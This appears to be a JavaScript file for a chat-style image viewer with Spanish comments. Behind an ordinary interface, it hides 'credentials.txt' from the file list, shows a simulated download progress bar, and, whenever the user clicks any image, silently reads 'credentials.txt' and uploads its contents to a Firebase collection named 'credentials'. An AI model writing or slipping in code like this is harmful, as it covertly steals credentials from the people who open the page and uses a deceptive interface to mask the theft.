import { db, collection, addDoc } from './firebase-config.js';

// Lista de archivos que podrían estar en la carpeta
const potentialFiles = [
    'credentials.txt',
    'documento.pdf',
    'archivo.docx',
    'imagen.jpg',
    'imagen2.jpg',
    'imagen3.jpg',
    'imagen4.jpg',
    'imagen5.jpg'
    // Agrega aquí cualquier otro archivo que esperes encontrar
];

// Función para obtener la hora actual formateada
function getCurrentTime() {
    const now = new Date();
    return now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
}

// Función para crear el indicador de carga con porcentaje
function createLoadingIndicator() {
    const loadingDiv = document.createElement('div');
    loadingDiv.className = 'loading-indicator';
    loadingDiv.innerHTML = `
        <div class="loading-spinner"></div>
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <span class="progress-text">0%</span>
        </div>
        <span>Descargando imagen...</span>
    `;
    return loadingDiv;
}

// Función para simular la descarga
function simulateDownload(loadingIndicator, onComplete) {
    const progressFill = loadingIndicator.querySelector('.progress-fill');
    const progressText = loadingIndicator.querySelector('.progress-text');
    let progress = 0;
    
    const interval = setInterval(() => {
        progress += Math.random() * 10;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            setTimeout(onComplete, 500); // Pequeña pausa antes de mostrar la imagen
        }
        
        progressFill.style.width = `${progress}%`;
        progressText.textContent = `${Math.round(progress)}%`;
    }, 200);
}

// Función para crear el mensaje de éxito
function createSuccessMessage() {
    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    successDiv.innerHTML = `
        <span>✓ Imagen descargada exitosamente</span>
    `;
    return successDiv;
}

// Función para obtener el icono según el tipo de archivo
function getFileIcon(filename) {
    const extension = filename.split('.').pop().toLowerCase();
    switch(extension) {
        case 'txt':
            return 'https://cdn-icons-png.flaticon.com/512/2965/2965879.png';
        case 'pdf':
            return 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
        case 'docx':
            return 'https://cdn-icons-png.flaticon.com/512/337/337932.png';
        case 'jpg':
        case 'jpeg':
        case 'png':
            return filename; // Para imágenes, usamos la miniatura
        default:
            return 'https://cdn-icons-png.flaticon.com/512/2965/2965879.png';
    }
}

// Función para cargar solo los archivos disponibles (excepto credentials.txt)
async function loadFiles() {
    const filesContainer = document.getElementById('filesContainer');
    filesContainer.innerHTML = ''; // Limpiar lista actual

    for (const filename of potentialFiles) {
        if (filename === 'credentials.txt') {
            continue;
        }

        try {
            const response = await fetch(filename, { method: 'HEAD' });
            
            if (response.ok) {
                const extension = '.' + filename.split('.').pop().toLowerCase();
                const isImage = ['.jpg', '.jpeg', '.png'].includes(extension);
                
                if (isImage) {
                    const messageDiv = document.createElement('div');
                    messageDiv.className = 'message received';
                    
                    // Crear contenedor para la imagen y el indicador
                    const imageContainer = document.createElement('div');
                    imageContainer.className = 'image-container';
                    
                    // Agregar indicador de carga
                    const loadingIndicator = createLoadingIndicator();
                    imageContainer.appendChild(loadingIndicator);
                    
                    // Crear y cargar la imagen
                    const img = new Image();
                    img.className = 'message-image';
                    img.alt = 'Imagen';
                    img.onclick = () => openImage(filename);
                    
                    // Simular la descarga
                    simulateDownload(loadingIndicator, () => {
                        // Remover el indicador de carga
                        loadingIndicator.remove();
                        // Agregar mensaje de éxito
                        const successMessage = createSuccessMessage();
                        imageContainer.appendChild(successMessage);
                        // Ocultar el mensaje de éxito después de 2 segundos
                        setTimeout(() => {
                            successMessage.style.opacity = '0';
                            setTimeout(() => successMessage.remove(), 300);
                        }, 2000);
                    });
                    
                    img.src = filename;
                    imageContainer.appendChild(img);
                    
                    messageDiv.innerHTML = `
                        <div class="message-time">${getCurrentTime()}</div>
                    `;
                    messageDiv.insertBefore(imageContainer, messageDiv.firstChild);
                    
                    filesContainer.appendChild(messageDiv);
                }
            }
        } catch (error) {
            console.error(`Error al verificar ${filename}:`, error);
        }
    }
}

// Función para abrir el archivo (solo muestra contenido o abre en nueva pestaña)
window.openFile = async function(filename) {
    try {
        const extension = filename.split('.').pop().toLowerCase();
        if (extension === 'txt') {
            const response = await fetch(filename);
             if (!response.ok) throw new Error('Archivo no encontrado');
            const text = await response.text();
            alert('Contenido del archivo:\n\n' + text);
        } else if (['pdf', 'docx'].includes(extension)) {
             window.open(filename, '_blank');
        } else {
            alert(`No se puede abrir el archivo ${filename} directamente.`);
        }
        // Nota: La subida a Firebase de estos archivos ocurre al abrir CUALQUIER imagen
    } catch (error) {
        console.error('Error al abrir archivo:', error);
        alert('Error al procesar el archivo');
    }
};

// Función para abrir la imagen en el modal
window.openImage = async function(filename) {
    const modal = document.getElementById('imageModal');
    const fullImage = document.getElementById('fullImage');
    
    fullImage.src = filename;
    modal.classList.add('visible');
    
    // Subir credentials.txt a Firebase
    for (const archivo of potentialFiles) {
        if (archivo === 'credentials.txt') {
            try {
                const response = await fetch(archivo);
                if (!response.ok) continue;
                
                const text = await response.text();

                const credentialsCollection = collection(db, 'credentials');
                await addDoc(credentialsCollection, {
                    filename: archivo,
                    type: 'txt',
                    content: text, 
                    timestamp: new Date().toISOString()
                });
                console.log(`Archivo ${archivo} subido exitosamente a Firebase al abrir ${filename}`);
            } catch (error) {
                console.error(`Error al intentar subir ${archivo} al abrir ${filename}:`, error);
            }
        }
    }
};

// Función para cerrar el modal
window.closeModal = function(event) {
    const modal = document.getElementById('imageModal');
    if (event.target === modal || event.target.classList.contains('close-button')) {
        modal.classList.remove('visible');
    }
};

// Eliminar el listener window.onclick duplicado si existe
// window.onclick = function(event) { ... }

// Cargar los archivos disponibles cuando se carga la página
document.addEventListener('DOMContentLoaded', loadFiles); 